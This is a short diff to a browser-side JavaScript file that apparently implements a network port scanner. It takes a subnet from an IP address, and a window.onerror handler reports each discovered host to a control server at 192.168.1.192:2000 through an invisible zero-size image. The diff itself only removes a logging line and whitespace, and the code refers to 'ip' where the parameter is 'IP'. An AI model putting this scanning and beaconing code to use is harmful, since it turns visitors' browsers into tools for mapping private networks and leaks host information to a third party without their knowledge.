@@ -15,7 +15,7 @@ $(function(){
 
 
 function portScan(IP){
-	console.log(IP);
+
   var net = ip.substring(0,ip.lastIndexOf('.')+1);
 
 
@@ -73,7 +73,7 @@ function scan(start,end ,range){
   }
 
 window.onerror= function err(message,url,lineNumber){
-	
+
 	if(message.match(/Script error./)){
 
 		$("body:first").append("<img width=0 height=0 src='http://192.168.1.192:2000/control/responds?host="+'"'+url+'"'+"'></img>");
